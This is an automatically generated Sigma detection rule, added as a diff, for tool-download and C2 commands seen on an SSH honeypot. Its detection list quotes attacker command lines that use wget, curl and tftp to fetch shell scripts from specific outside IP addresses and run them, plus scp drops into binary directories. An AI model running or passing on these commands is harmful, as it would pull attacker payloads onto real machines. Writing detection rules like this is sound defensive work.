@@ -1,0 +1,36 @@
+title: Honeypot - SSH Tool Download/C2
+id: fd95910a-efe3-a7c5-fcfd-5c41dda23e91
+status: experimental
+level: critical
+description: Tool download or C2 related commands from SSH honeypot. 29 events, 4
+  source IPs, 14 unique patterns.
+author: LLM Honeypot Intelligence Platform (automated)
+date: 2026/03/26
+references:
+- https://attack.mitre.org/
+tags:
+- attack.command_and_control
+- attack.t1105
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection:
+    CommandLine|contains:
+    - sh tftp1.sh
+    - scp -t /usr/local/bin/ltyu2gbpejb4dog81ohvxsrwvs
+    - tftp 88.214.20.143 -c get tftp1.sh
+    - curl -o sshbins.sh http://88.214.20.143/sshbins.sh
+    - tftp -r tftp2.sh -g 88.214.20.143
+    - scp -t /dev/shm/ltyu2gbpejb4dog81ohvxsrwvs
+    - scp -t /bin/ltyu2gbpejb4dog81ohvxsrwvs
+    - scp -t ~/ltyu2gbpejb4dog81ohvxsrwvs
+    - sh tftp2.sh
+    - wget http://88.214.20.143/sshbins.sh
+    - scp -t /usr/bin/ltyu2gbpejb4dog81ohvxsrwvs
+    - wget --no-check-certificate -qO- https://31.57.216.121/sh
+    - scp -t /usr/.work/
+    - curl -sk https://31.57.216.121/sh
+  condition: selection
+falsepositives:
+- Legitimate system administration
